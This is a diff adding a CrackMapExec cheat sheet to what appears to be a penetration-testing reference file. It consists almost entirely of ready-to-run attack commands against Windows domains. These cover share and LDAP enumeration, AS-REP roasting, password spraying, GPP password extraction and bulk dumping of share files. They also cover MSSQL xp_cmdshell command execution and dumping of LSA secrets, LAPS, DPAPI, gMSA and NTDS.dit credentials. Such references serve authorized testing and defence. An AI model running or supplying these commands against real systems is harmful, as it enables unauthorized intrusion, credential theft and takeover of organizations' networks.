@@ -731,6 +731,146 @@ Get Hashes
 bash$ cme smb <target> -u username -p password --sam
 ```
 
+## CrackMapExec Cheat Sheet
+### Initial Enumeration
+```bash
+crackmapexec smb <ip>
+```
+
+### Testing null/guest authentication and listing shares
+```bash
+crackmapexec smb targets.txt -u '' -p '' --shares
+```
+
+```bash
+crackmapexec smb targets.txt -u 'Guest' -p '' --shares
+```
+
+### Enumerate users using ldap
+```bash
+crackmapexec ldap <domain> -u '' -p '' --users
+```
+
+```bash
+crackmapexec ldap <domain> -u users.txt -p "" -k
+```
+
+### Asreproast
+```bash
+crackmapexec ldap <domain> -u <username> -p "" --asreproast asrep.txt
+```
+
+### Bloodhound
+```bash
+crackmapexec ldap <domain> -u <username> -p <password> --bloodhound -ns <ip> --collection All
+```
+
+### Group Policy Preferences
+- https://www.thehacker.recipes/ad/movement/credentials/dumping/group-policies-preferences
+```bash
+crackmapexec smb <domain> -u <username> -p <password> -M gpp_password
+```
+
+### Creds Spray
+```bash
+crackmapexec smb targets.txt -u <username> -p <password>
+```
+
+### Password Spray
+```bash
+crackmapexec ldap <domain> -u users.txt -p <password> --continue-on-success
+```
+
+```bash
+crackmapexec ldap <domain> -u users.txt -p <password> --no-bruteforce --continue-on-success
+```
+
+### STATUS_NOT_SUPPORTED: NTLM protocol not supported
+In this case we can use the `-k` option which will use Kerberos protocol to authenticate.
+```bash
+crackmapexec smb targets.txt -u <username> -p <password> -k
+```
+
+### List shares
+```bash
+crackmapexec smb targets.txt -u <username> -p <password> -k --shares
+```
+
+### Spider_plus Module
+The module `spider_plus` allows you to list and dump all files from all readable shares
+#### List all readable files
+```bash
+crackmapexec smb <domain> -u <username> -p <password> -k -M spider_plus
+```
+
+#### Dump all files
+```bash
+crackmapexec smb <domain> -u <username> -p <password> -M spider_plus -o READ_ONLY=false
+```
+
+#### Dump a specific file
+```bash
+crackmapexec smb <domain> -u <username> -p <password> -k --get-file <target_file> <output_file> --share <sharename>
+```
+
+
+### MSSQL
+#### Test authentication
+```bash
+crackmapexec mssql targets.txt -u <username> -p <password>
+```
+
+#### Execute commands using `xp_cmdshell`
+- `-X` for powershell and `-x` for cmd
+```bash
+crackmapexec mssql <domain> -u <username> -p <password> -X <command_to_execute>
+```
+
+#### Get a file
+```bash
+crackmapexec mssql <domain> -u <username> -p <password> --get-file <output_file> <target_file>
+```
+
+### Local Administrator authentication
+```bash
+crackmapexec smb <domain> -u <username> -p <password> --local-auth
+```
+
+### Dump the LSA secrets
+```bash
+crackmapexec smb <domain> -u <username> -p <password> --local-auth --lsa
+```
+
+### Recover the name of the gmsa account
+- https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent
+We have two possibilities to recover the name of the gmsa account:
+- Using the `--gmsa-convert-id` option:
+```bash
+crackmapexec ldap <domain> -u <username> -p <password> --gmsa-convert-id <id>
+```
+- Decrypt the gmsa account in lsa with `--gmsa-decrypt-lsa`:
+```bash
+crackmapexec ldap <domain> -u <username> -p <password> --gmsa-decrypt-lsa <gmsa_account>
+```
+
+### Dump LAPS password
+```bash
+crackmapexec smb targets.txt -u <username> -p <password> --laps
+```
+
+### Dump the credentials of the dpapi
+```bash
+crackmapexec smb targets.txt -u <username> -p <password> --laps --dpapi
+```
+
+### Dump NTDS.dit
+```bash
+crackmapexec smb <domain> -u <username> -p <password> --ntds
+```
+
+### References
+- https://github.com/mpgn/CrackMapExec
+- https://wiki.porchetta.industries/smb-protocol/scan-for-vulnerabilities
 
 
 ## Crackmapexec to Empire agent
